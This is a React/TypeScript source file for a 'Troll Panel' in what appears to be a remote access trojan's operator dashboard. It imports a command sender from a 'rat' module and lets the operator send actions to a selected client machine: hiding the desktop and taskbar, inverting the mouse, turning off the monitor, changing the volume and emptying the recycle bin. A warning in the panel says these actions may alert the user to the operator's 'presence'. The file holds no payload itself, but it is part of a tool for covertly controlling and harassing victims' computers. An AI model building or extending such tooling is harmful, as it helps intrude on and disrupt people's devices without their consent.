import { useState } from "react";
import { useParams } from "react-router-dom";
import { sendTrollCommand } from "../rat/RATCommands";
import {
  IconDeviceDesktop,
  IconDeviceDesktopOff,
  IconLayoutBottombar,
  IconLayoutBottombarCollapse,
  IconBellRinging,
  IconBellOff,
  IconArrowAutofitDown,
  IconTrash,
  IconMouse,
  IconMouseOff,
  IconScreenShare,
  IconScreenShareOff,
  IconVolume,
  IconVolumeOff,
  IconVolume3,
  IconVolume2,
} from "@tabler/icons-react";

// TrollCommand enum
enum TrollCommand {
  HideDesktop = "HideDesktop",
  ShowDesktop = "ShowDesktop",
  HideTaskbar = "HideTaskbar",
  ShowTaskbar = "ShowTaskbar",
  HideNotify = "HideNotify",
  ShowNotify = "ShowNotify",
  FocusDesktop = "FocusDesktop",
  EmptyTrash = "EmptyTrash",
  RevertMouse = "RevertMouse",
  NormalMouse = "NormalMouse",
  MonitorOff = "MonitorOff",
  MonitorOn = "MonitorOn",
  MaxVolume = "MaxVolume",
  MinVolume = "MinVolume",
  MuteVolume = "MuteVolume",
  UnmuteVolume = "UnmuteVolume",
}

export const Troll = () => {
  const { addr } = useParams();
  const [activeCommands, setActiveCommands] = useState<Record<string, boolean>>(
    {}
  );
  const [loading, setLoading] = useState<Record<string, boolean>>({});

  const handleTrollCommand = async (command: TrollCommand) => {
    if (!addr) return;

    // Set loading state for this command
    setLoading((prev) => ({ ...prev, [command]: true }));

    try {
      await sendTrollCommand(addr, command);

      // For one-time actions, briefly show them as active then reset
      if (isOneTimeAction(command)) {
        setActiveCommands((prev) => ({ ...prev, [command]: true }));

        // Reset active state after a short delay
        setTimeout(() => {
          setActiveCommands((prev) => ({ ...prev, [command]: false }));
        }, 1000);
      }
      // For toggle commands, update the active state
      else if (isToggleCommand(command)) {
        setActiveCommands((prev) => {
          const newState = { ...prev };

          // If this is a "show" command, set its pair to inactive
          if (command.startsWith("Show")) {
            const hideCommand = command.replace("Show", "Hide");
            newState[hideCommand] = false;
            newState[command] = true;
          }
          // If this is a "hide" command, set its pair to inactive
          else if (command.startsWith("Hide")) {
            const showCommand = command.replace("Hide", "Show");
            newState[showCommand] = false;
            newState[command] = true;
          }
          // For other toggle commands
          else if (command === TrollCommand.NormalMouse) {
            newState[TrollCommand.RevertMouse] = false;
            newState[command] = true;
          } else if (command === TrollCommand.RevertMouse) {
            newState[TrollCommand.NormalMouse] = false;
            newState[command] = true;
          } else if (command === TrollCommand.MonitorOn) {
            newState[TrollCommand.MonitorOff] = false;
            newState[command] = true;
          } else if (command === TrollCommand.MonitorOff) {
            newState[TrollCommand.MonitorOn] = false;
            newState[command] = true;
          } else if (command === TrollCommand.UnmuteVolume) {
            newState[TrollCommand.MuteVolume] = false;
            newState[command] = true;
          } else if (command === TrollCommand.MuteVolume) {
            newState[TrollCommand.UnmuteVolume] = false;
            newState[command] = true;
          } else if (command === TrollCommand.MaxVolume) {
            newState[TrollCommand.MinVolume] = false;
            newState[TrollCommand.MuteVolume] = false;
            newState[command] = true;
          } else if (command === TrollCommand.MinVolume) {
            newState[TrollCommand.MaxVolume] = false;
            newState[TrollCommand.MuteVolume] = false;
            newState[command] = true;
          }

          return newState;
        });
      }
    } catch (error) {
      console.error("Failed to send troll command:", error);
    } finally {
      // Clear loading state
      setLoading((prev) => ({ ...prev, [command]: false }));
    }
  };

  // Helper to determine if a command is part of a toggle pair
  const isToggleCommand = (command: TrollCommand): boolean => {
    return [
      TrollCommand.HideDesktop,
      TrollCommand.ShowDesktop,
      TrollCommand.HideTaskbar,
      TrollCommand.ShowTaskbar,
      TrollCommand.HideNotify,
      TrollCommand.ShowNotify,
      TrollCommand.RevertMouse,
      TrollCommand.NormalMouse,
      TrollCommand.MonitorOff,
      TrollCommand.MonitorOn,
      TrollCommand.MuteVolume,
      TrollCommand.UnmuteVolume,
      // These are not actual toggles, but we want to track their button state
      TrollCommand.MaxVolume,
      TrollCommand.MinVolume,
    ].includes(command);
  };

  // Helper to determine if a command is a one-time action rather than a toggle
  const isOneTimeAction = (command: TrollCommand): boolean => {
    return [TrollCommand.FocusDesktop, TrollCommand.EmptyTrash].includes(
      command
    );
  };

  // Get the appropriate CSS class for a button based on its state
  const getButtonClass = (
    command: TrollCommand,
    placeholder: boolean = false
  ): string => {
    if (placeholder) {
      return "bg-gray-800 text-gray-500 border-accentx cursor-not-allowed opacity-60";
    }

    if (loading[command]) {
      return "bg-gray-700 border-gray-600 text-gray-300 cursor-wait";
    }

    if (activeCommands[command]) {
      return "bg-green-900 border-green-700 text-white";
    }

    return "bg-secondarybg border-accentx text-white hover:bg-accentx hover:border-accentx transition-all duration-200";
  };

  return (
    <div className="p-3 flex flex-1 flex-col overflow-auto w-full bg-primarybg h-screen">
      {/* Header */}
      <div className="flex justify-between items-center mb-3">
        <div className="flex items-center gap-2">
          <svg
            className="text-accentx"
            width="20"
            height="20"
            viewBox="0 0 24 24"
            strokeWidth="1.5"
            stroke="currentColor"
            fill="none"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
            <path d="M8 9l3 3l-3 3" />
            <path d="M13 15l3 0" />
            <path d="M3 5a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v14a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-14z" />
          </svg>
          <h1 className="text-xl font-medium text-white">Troll Panel</h1>
        </div>
      </div>

      {/* Warning */}
      <div className="bg-yellow-900/30 border border-yellow-800 rounded-lg p-2 mb-3 text-md">
        <div className="flex items-start">
          <svg
            className="text-yellow-500 mt-0.5 mr-2 flex-shrink-0"
            width="14"
            height="14"
            viewBox="0 0 24 24"
            strokeWidth="2"
            stroke="currentColor"
            fill="none"
          >
            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
            <path d="M12 9v4"></path>
            <path d="M10.363 3.591l-8.106 13.534a1.914 1.914 0 0 0 1.636 2.871h16.214a1.914 1.914 0 0 0 1.636 -2.87l-8.106 -13.536a1.914 1.914 0 0 0 -3.274 0z"></path>
            <path d="M12 16h.01"></path>
          </svg>
          <div>
            <h3 className="text-yellow-500 font-medium text-md">
              Use with caution
            </h3>
            <p className="text-yellow-100/70 text-md mt-0.5">
              These commands manipulate the client's interface in real-time.
              Actions like hiding taskbars, controlling volume, and toggling
              displays are visible to the user and may alert them to your
              presence.
            </p>
          </div>
        </div>
      </div>

      {!addr ? (
        <div className="flex items-center justify-center h-32 bg-secondarybg border border-accentx rounded-lg">
          <p className="text-gray-400 text-md">No client selected</p>
        </div>
      ) : (
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-2">
          {/* DESKTOP CONTROLS */}
          <div className="bg-secondarybg border border-accentx rounded-lg overflow-hidden">
            <div className="bg-primarybg border-b border-accentx px-2 py-1.5">
              <h3 className="text-white font-medium text-md">
                Desktop & Taskbar
              </h3>
            </div>
            <div className="p-2 space-y-1.5">
              <TrollButton
                title="Hide Desktop Icons"
                icon={<IconDeviceDesktopOff size={16} />}
                command={TrollCommand.HideDesktop}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.HideDesktop]}
                loading={loading[TrollCommand.HideDesktop]}
              />

              <TrollButton
                title="Show Desktop Icons"
                icon={<IconDeviceDesktop size={16} />}
                command={TrollCommand.ShowDesktop}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.ShowDesktop]}
                loading={loading[TrollCommand.ShowDesktop]}
              />

              <TrollButton
                title="Hide Taskbar"
                icon={<IconLayoutBottombarCollapse size={16} />}
                command={TrollCommand.HideTaskbar}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.HideTaskbar]}
                loading={loading[TrollCommand.HideTaskbar]}
              />

              <TrollButton
                title="Show Taskbar"
                icon={<IconLayoutBottombar size={16} />}
                command={TrollCommand.ShowTaskbar}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.ShowTaskbar]}
                loading={loading[TrollCommand.ShowTaskbar]}
              />
            </div>
          </div>

          {/* NOTIFICATION CONTROLS */}
          <div className="bg-secondarybg border border-accentx rounded-lg overflow-hidden">
            <div className="bg-primarybg border-b border-accentx px-2 py-1.5">
              <h3 className="text-white font-medium text-md">System Actions</h3>
            </div>
            <div className="p-2 space-y-1.5">
              <TrollButton
                title="Hide Notification Area"
                icon={<IconBellOff size={16} />}
                command={TrollCommand.HideNotify}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.HideNotify]}
                loading={loading[TrollCommand.HideNotify]}
              />

              <TrollButton
                title="Show Notification Area"
                icon={<IconBellRinging size={16} />}
                command={TrollCommand.ShowNotify}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.ShowNotify]}
                loading={loading[TrollCommand.ShowNotify]}
              />

              <TrollButton
                title="Focus Desktop"
                icon={<IconArrowAutofitDown size={16} />}
                command={TrollCommand.FocusDesktop}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.FocusDesktop]}
                loading={loading[TrollCommand.FocusDesktop]}
              />

              <TrollButton
                title="Empty Recycle Bin"
                icon={<IconTrash size={16} />}
                command={TrollCommand.EmptyTrash}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.EmptyTrash]}
                loading={loading[TrollCommand.EmptyTrash]}
              />
            </div>
          </div>

          {/* INPUT CONTROLS */}
          <div className="bg-secondarybg border border-accentx rounded-lg overflow-hidden">
            <div className="bg-primarybg border-b border-accentx px-2 py-1.5">
              <h3 className="text-white font-medium text-md">
                Mouse & Display
              </h3>
            </div>
            <div className="p-2 space-y-1.5">
              <TrollButton
                title="Invert Mouse Buttons"
                icon={<IconMouseOff size={16} />}
                command={TrollCommand.RevertMouse}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.RevertMouse]}
                loading={loading[TrollCommand.RevertMouse]}
              />

              <TrollButton
                title="Normal Mouse"
                icon={<IconMouse size={16} />}
                command={TrollCommand.NormalMouse}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.NormalMouse]}
                loading={loading[TrollCommand.NormalMouse]}
              />

              <TrollButton
                title="Turn Off Monitor"
                icon={<IconScreenShareOff size={16} />}
                command={TrollCommand.MonitorOff}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.MonitorOff]}
                loading={loading[TrollCommand.MonitorOff]}
              />

              <TrollButton
                title="Turn On Monitor"
                icon={<IconScreenShare size={16} />}
                command={TrollCommand.MonitorOn}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.MonitorOn]}
                loading={loading[TrollCommand.MonitorOn]}
              />
            </div>
          </div>

          {/* AUDIO CONTROLS */}
          <div className="bg-secondarybg border border-accentx rounded-lg overflow-hidden">
            <div className="bg-primarybg border-b border-accentx px-2 py-1.5">
              <h3 className="text-white font-medium text-md">Volume Control</h3>
            </div>
            <div className="p-2 space-y-1.5">
              <TrollButton
                title="Maximum Volume"
                icon={<IconVolume3 size={16} />}
                command={TrollCommand.MaxVolume}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.MaxVolume]}
                loading={loading[TrollCommand.MaxVolume]}
              />

              <TrollButton
                title="Minimum Volume"
                icon={<IconVolume2 size={16} />}
                command={TrollCommand.MinVolume}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.MinVolume]}
                loading={loading[TrollCommand.MinVolume]}
              />

              <TrollButton
                title="Mute Volume"
                icon={<IconVolumeOff size={16} />}
                command={TrollCommand.MuteVolume}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.MuteVolume]}
                loading={loading[TrollCommand.MuteVolume]}
              />

              <TrollButton
                title="Unmute Volume"
                icon={<IconVolume size={16} />}
                command={TrollCommand.UnmuteVolume}
                onClick={handleTrollCommand}
                active={activeCommands[TrollCommand.UnmuteVolume]}
                loading={loading[TrollCommand.UnmuteVolume]}
              />
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

interface TrollButtonProps {
  title: string;
  icon: React.ReactNode;
  command: TrollCommand;
  onClick: (command: TrollCommand) => void;
  active?: boolean;
  loading?: boolean;
  placeholder?: boolean;
}

const TrollButton = ({
  title,
  icon,
  command,
  onClick,
  active = false,
  loading = false,
  placeholder = false,
}: TrollButtonProps) => {
  return (
    <button
      className={`w-full flex items-center gap-2 px-2 py-1.5 rounded text-md border ${
        placeholder
          ? "bg-gray-800 text-gray-500 border-accentx opacity-60"
          : loading
          ? "bg-gray-700 border-gray-600 text-gray-300"
          : active
          ? "bg-green-900 border-green-700 text-white"
          : "bg-secondarybg border-accentx text-white hover:bg-accentx hover:border-accentx transition-all duration-200"
      } ${!placeholder && !loading ? "cursor-pointer" : "cursor-not-allowed"}`}
      onClick={() => !loading && !placeholder && onClick(command)}
      disabled={loading || placeholder}
    >
      {/* Icon with loading indicator */}
      <div className="flex-shrink-0">
        {loading ? (
          <div className="animate-spin">
            <svg
              className="w-3.5 h-3.5"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                opacity="0.2"
                d="M12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2Z"
                fill="currentColor"
              />
              <path
                d="M12 22C17.5228 22 22 17.5228 22 12H18C18 15.3137 15.3137 18 12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6V2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"
                fill="currentColor"
              />
            </svg>
          </div>
        ) : (
          icon
        )}
      </div>

      {/* Text content */}
      <span className="font-medium truncate">{title}</span>

      {placeholder && (
        <span className="ml-auto text-[10px] text-gray-500">Soon</span>
      )}
    </button>
  );
};
